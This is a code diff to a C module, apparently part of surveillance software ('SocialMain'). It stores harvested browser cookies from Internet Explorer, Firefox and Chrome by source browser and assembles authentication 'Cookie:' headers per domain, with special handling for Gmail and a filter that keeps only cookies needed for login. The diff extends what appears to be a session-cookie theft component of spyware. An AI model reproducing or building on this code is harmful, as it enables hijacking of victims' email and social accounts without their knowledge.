@@ -5,7 +5,10 @@
 #include "SocialMain.h"
 #define _CRT_SECURE_NO_WARNINGS 1
 
+
+
 typedef struct _cookie_list_entry_struct {
+	int ifrom_browser;
 	char *domain;
 	char *name;
 	char *value;
@@ -84,7 +87,7 @@ void NormalizeDomainW(WCHAR *domain)
 	*dst = NULL;
 }
 
-BOOL AddCookieW(WCHAR *domain, WCHAR *name, WCHAR *value)
+BOOL AddCookieW(WCHAR *domain, WCHAR *name, WCHAR *value, int ifrom_browser)
 {
 	char *domain_a, *name_a, *value_a;
 	DWORD d_len, n_len, v_len;
@@ -111,7 +114,7 @@ BOOL AddCookieW(WCHAR *domain, WCHAR *name, WCHAR *value)
 	_snprintf_s(name_a, n_len, _TRUNCATE, "%S", name);		
 	_snprintf_s(value_a, v_len, _TRUNCATE, "%S", value);		
 	
-	ret_val = AddCookieA(domain_a, name_a, value_a);
+	ret_val = AddCookieA(domain_a, name_a, value_a, ifrom_browser);
 
 	SAFE_FREE(domain_a);
 	SAFE_FREE(name_a);
@@ -120,7 +123,7 @@ BOOL AddCookieW(WCHAR *domain, WCHAR *name, WCHAR *value)
 	return ret_val;
 }
 
-BOOL AddCookieA(char *domain_tmp, char *name, char *value)
+BOOL AddCookieA(char *domain_tmp, char *name, char *value, int ifrom_browser)
 {
 	DWORD i;
 	char domain[2048];
@@ -129,20 +132,19 @@ BOOL AddCookieA(char *domain_tmp, char *name, char *value)
 	if (!domain_tmp || !name || !value)
 		return FALSE;
 
-	// Workaround per i cookie segnati sul dominio principale
+	// 变换到gmail域
 	if (!_stricmp("google.com", domain_tmp))
 		_snprintf_s(domain, sizeof(domain), _TRUNCATE, "mail.google.com");
 	else
 		_snprintf_s(domain, sizeof(domain), _TRUNCATE, "%s", domain_tmp);
 
-	// I cookie che iniziano con _ sono volatili, cambiano troppo spesso
-	// e non sono indispensabili per l'auth
-	if (name[0]=='_')
+	if (name[0]=='_')//以 '_' 开始的值是易变的， 经常改变，不是必须的认证
 		return FALSE;
 	
 	for (i=0; i<g_cookie_count; i++) {
 		if (g_cookie_list[i].domain && !_stricmp(g_cookie_list[i].domain, domain) && 
-			g_cookie_list[i].name && !_stricmp(g_cookie_list[i].name, name)) {
+			g_cookie_list[i].name && !_stricmp(g_cookie_list[i].name, name)
+			&& g_cookie_list[i].ifrom_browser == ifrom_browser) {
 			if (g_cookie_list[i].value && !_stricmp(g_cookie_list[i].value, value))
 				return FALSE;
 			SAFE_FREE(g_cookie_list[i].value);
@@ -158,13 +160,14 @@ BOOL AddCookieA(char *domain_tmp, char *name, char *value)
 	g_cookie_list[g_cookie_count].domain = _strdup(domain);
 	g_cookie_list[g_cookie_count].name = _strdup(name);
 	g_cookie_list[g_cookie_count].value = _strdup(value);
+	g_cookie_list[g_cookie_count].ifrom_browser = ifrom_browser;
 	SetNewCookie(domain);
 	g_cookie_count++;
 	return TRUE;
 }
 
 #define COOKIE_MIN_LEN 32
-char *GetCookieString(char *domain)
+char *GetCookieStringByFromBrowser(char *domain, int ifrom_browser)
 {
 	DWORD i, len = COOKIE_MIN_LEN;
 	char *cookie_string;
@@ -172,7 +175,9 @@ char *GetCookieString(char *domain)
 		return NULL;
 
 	for (i=0; i<g_cookie_count; i++) {
-		if (g_cookie_list[i].domain && !strcmp(g_cookie_list[i].domain, domain) &&
+		if (g_cookie_list[i].domain && 
+			!strcmp(g_cookie_list[i].domain, domain) &&
+			g_cookie_list[i].ifrom_browser == ifrom_browser &&
 			g_cookie_list[i].name && g_cookie_list[i].value) {
 			len += strlen(g_cookie_list[i].name);
 			len += strlen(g_cookie_list[i].value);
@@ -188,7 +193,8 @@ char *GetCookieString(char *domain)
 	sprintf_s(cookie_string, len, "Cookie:");
 
 	for (i=0; i<g_cookie_count; i++) {
-		if (g_cookie_list[i].domain && !strcmp(g_cookie_list[i].domain, domain)) {
+		if (g_cookie_list[i].domain && !strcmp(g_cookie_list[i].domain, domain) 
+			&& g_cookie_list[i].ifrom_browser == ifrom_browser) {
 			if (g_cookie_list[i].name && g_cookie_list[i].value) {
 				strcat_s(cookie_string, len, " ");
 				strcat_s(cookie_string, len, g_cookie_list[i].name);
@@ -200,4 +206,21 @@ char *GetCookieString(char *domain)
 	}
 
 	return cookie_string;
+}
+#define COOKIE_FROM_IE            0
+#define COOKIE_FROM_FIRE_FOX      1
+#define COOKIE_FROM_CHROME        2
+#define COOKIE_FROM_NONE_MAX      3
+
+char **GetCookieStringNew(char *domain)
+{
+	char** ppCookie = (char**)malloc( sizeof(char*)*COOKIE_FROM_NONE_MAX);
+	if (!ppCookie)
+		return NULL;
+	for (int i = COOKIE_FROM_IE; i < COOKIE_FROM_NONE_MAX; i++)
+	{
+		ppCookie[i] = GetCookieStringByFromBrowser(domain, i);
+	}
+
+	return ppCookie;
 }
